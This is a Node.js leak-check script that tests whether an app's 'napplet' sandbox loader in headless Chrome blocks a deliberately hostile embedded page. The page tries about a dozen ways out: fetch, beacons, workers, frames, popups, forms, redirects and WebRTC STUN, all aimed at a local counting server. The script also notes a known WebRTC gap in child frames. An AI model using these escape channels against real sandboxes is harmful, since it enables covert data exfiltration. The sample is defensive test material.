// Napplet leak check (plan P2, docs/napplets/P2_EMOJI.md), in a real Chrome: a hostile napplet tries every way out we
// know of, once through the P1 loader (opaque origin: the control, which must leak by navigating) and once through the
// P2 loader on its own origin (public/napplet-frame.html + napplet-sw.js, served as nappletOriginFile serves them).
// Each attempt names itself in the URL it calls; a local "author" server counts what arrives, and a UDP socket
// counts STUN packets (WebRTC).
//   node tools/napplet-leak-check.mjs            (needs Google Chrome; exits 1 if the P2 loader lets a navigation,
//                                                 fetch or frame out, or the control doesn't leak)
// Not part of `npm test`: it needs a browser. Run it after touching the loader, the service worker or their headers.
import http from "node:http"
import dgram from "node:dgram"
import fs from "node:fs"
import os from "node:os"
import path from "node:path"
import { spawn } from "node:child_process"
import { loaderCsp, nappletOriginFile, LOADER_FILE } from "../src/napplet/csp.js"
import { nappletParentHost } from "../src/napplet/origin.js"

const CHROME = process.env.CHROME || "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"
const pub = f => fs.readFileSync(new URL(`../public/${f}`, import.meta.url))
const rand = () => 20000 + Math.floor(Math.random() * 30000)
const P = rand(), DEBUG = rand(), ID = "n-" + "5e".repeat(16)
const hits = [], stun = { n: 0 }
const udp = dgram.createSocket("udp4")
udp.on("message", () => stun.n++)
await new Promise(r => udp.bind(0, "127.0.0.1", r))
const STUN = udp.address().port
const AUTHOR = `http://127.0.0.1:${P}`

// The hostile napplet: one line per way out. Runs after the loader wrote it over itself.
const evil = `<!doctype html><html><head></head><body><script>
const out = (w) => "${AUTHOR}/leak?" + w
const rtc = (W, tag) => { try { if (typeof W.RTCPeerConnection !== "function") return parent.postMessage({ rtc: tag, has: false }, "*")
  const pc = new W.RTCPeerConnection({ iceServers: [{ urls: "stun:127.0.0.1:${STUN}" }] }); pc.createDataChannel("x")
  pc.createOffer().then(o => pc.setLocalDescription(o)); parent.postMessage({ rtc: tag, has: true }, "*") } catch (e) { parent.postMessage({ rtc: tag, err: String(e) }, "*") } }
fetch(out("fetch")).catch(() => {})
new Image().src = out("img")
navigator.sendBeacon?.(out("beacon"))
try { const w = new Worker(URL.createObjectURL(new Blob(["fetch('" + out("worker") + "')"]))) } catch {}
try { const f = document.createElement("iframe"); f.src = out("childframe"); document.body.appendChild(f) } catch {}
try { window.open(out("popup")) } catch {}
rtc(window, "direct")
try { const c = document.createElement("iframe"); document.body.appendChild(c); rtc(window[window.length - 1], "blank-child") } catch (e) { parent.postMessage({ rtc: "blank-child", err: String(e) }, "*") }
setTimeout(() => { try { const f = document.createElement("form"); f.action = out("form"); f.method = "get"; document.body.appendChild(f); f.submit() } catch {} }, 300)
setTimeout(() => { const a = document.createElement("a"); a.href = out("link"); document.body.appendChild(a); a.click() }, 600)
setTimeout(() => { const m = document.createElement("meta"); m.httpEquiv = "refresh"; m.content = "0;url=" + out("meta-refresh"); document.head.appendChild(m) }, 900)
setTimeout(() => { navigation?.navigate?.(out("navigation-api")) }, 1200)
setTimeout(() => { location.href = out("location") }, 1500)
</` + `script></body></html>`

const parentPage = (mode) => `<!doctype html><body><script>
const log = { mode: ${JSON.stringify(mode)}, loads: 0, guards: null, left: 0, rtc: [] }
const show = () => { document.title = JSON.stringify(log) }
const f = document.createElement("iframe")
f.sandbox = ${JSON.stringify(mode === "p2" ? "allow-scripts allow-same-origin" : "allow-scripts")}
f.src = ${JSON.stringify(mode === "p2" ? `http://${ID}.localhost:${P}/vault/${LOADER_FILE}` : `http://localhost:${P}/vault/${LOADER_FILE}`)}
f.onload = () => { log.loads++; show() }
addEventListener("message", e => {
  if (e.source !== f.contentWindow) return
  const d = e.data || {}
  if (d.type === "nv-loader.ready") { log.guards = d.guards ?? null; f.contentWindow.postMessage({ type: "nv-loader.write", html: ${JSON.stringify(evil).replace(/</g, "\\u003c")} }, "*") }
  else if (d.type === "nv-loader.left") log.left++
  else if (d.rtc) log.rtc.push(d)
  show()
})
document.body.appendChild(f)
setTimeout(() => { log.done = true; show() }, 6000)
</` + `script>`

const server = http.createServer((req, res) => {
  const u = new URL(req.url, "http://x")
  if (u.pathname === "/leak") { hits.push(u.search.slice(1)); res.end("got it"); return }
  const parentHost = nappletParentHost(req.headers.host)
  if (parentHost) {
    const hit = nappletOriginFile(u.pathname, { host: req.headers.host, vaultHosts: [parentHost] })
    if (!hit) { res.statusCode = 404; return res.end() }
    res.writeHead(200, { ...hit.headers, "Content-Type": hit.type })
    return res.end(pub(hit.file))
  }
  if (u.pathname === `/vault/${LOADER_FILE}`) { res.writeHead(200, { "Content-Security-Policy": loaderCsp(), "Content-Type": "text/html" }); return res.end(pub(LOADER_FILE)) }
  if (u.pathname === "/p1" || u.pathname === "/p2") { res.writeHead(200, { "Content-Type": "text/html" }); return res.end(parentPage(u.pathname.slice(1))) }
  res.statusCode = 404; res.end()
})
await new Promise(r => server.listen(P, r))

async function run(mode) {
  hits.length = 0; stun.n = 0
  const profile = fs.mkdtempSync(path.join(os.tmpdir(), "nv-leak-"))
  const chrome = spawn(CHROME, ["--headless=new", `--remote-debugging-port=${DEBUG}`, `--user-data-dir=${profile}`, "--no-first-run", ...(process.env.DEBUG_LEAK ? ["--enable-logging=stderr", "--v=0"] : []), `http://localhost:${P}/${mode}`], { stdio: process.env.DEBUG_LEAK ? ["ignore", "ignore", "inherit"] : "ignore" }) // DEBUG_LEAK=1: Chrome's console on stderr
  let log = null
  for (let i = 0; i < 40 && !log?.done; i++) {
    await new Promise(r => setTimeout(r, 500))
    try {
      const pages = await (await fetch(`http://127.0.0.1:${DEBUG}/json/list`)).json()
      const t = pages.find(p => p.type === "page" && p.url.endsWith(`/${mode}`))?.title
      if (t?.startsWith("{")) log = JSON.parse(t.replace(/&quot;/g, '"').replace(/&#39;/g, "'").replace(/&lt;/g, "<").replace(/&gt;/g, ">").replace(/&amp;/g, "&"))
    } catch {}
  }
  await new Promise(r => setTimeout(r, 500)) // late STUN
  const exited = new Promise(r => chrome.once("exit", r))
  chrome.kill("SIGTERM")
  await Promise.race([exited, new Promise(r => setTimeout(r, 5000))]).then(() => chrome.exitCode === null && chrome.kill("SIGKILL"))
  fs.rmSync(profile, { recursive: true, force: true })
  return { log, hits: [...hits], stun: stun.n }
}

const p1 = await run("p1"), p2 = await run("p2")
server.close(); udp.close()
const show = (name, r) => console.log(`${name}: guards ${JSON.stringify(r.log?.guards)} · loads ${r.log?.loads} · left ${r.log?.left} · hits ${JSON.stringify(r.hits)} · STUN packets ${r.stun} · rtc ${JSON.stringify(r.log?.rtc)}`)
show("P1 loader (control)", p1)
show("P2 loader (own origin)", p2)
const fails = []
if (!p1.log?.done) fails.push("control never finished")
if (!p1.hits.length) fails.push("control leaked nothing: the check can't see a leak")
if (!p2.log?.done) fails.push("P2 run never finished")
if (!(p2.log?.guards?.nav && p2.log?.guards?.sw)) fails.push("P2 guards not up")
if (p2.hits.length) fails.push(`P2 let out: ${p2.hits.join(", ")}`)
if ((p2.log?.rtc ?? []).some(r => r.rtc === "direct" && r.has)) fails.push("P2 left RTCPeerConnection on the napplet's window")
// Known gap (P2_EMOJI.md): a child frame's own RTCPeerConnection. Reported, not failed.
const childRtc = (p2.log?.rtc ?? []).some(r => r.rtc === "blank-child" && r.has)
console.log(childRtc ? `KNOWN GAP: WebRTC through a child frame still works (${p2.stun} STUN packets left).` : "WebRTC through a child frame: blocked.")
console.log(fails.length ? `FAIL: ${fails.join("; ")}` : "PASS: no navigation, fetch, frame, form or popup left the P2 loader; the control leaked.")
process.exit(fails.length ? 1 : 0)
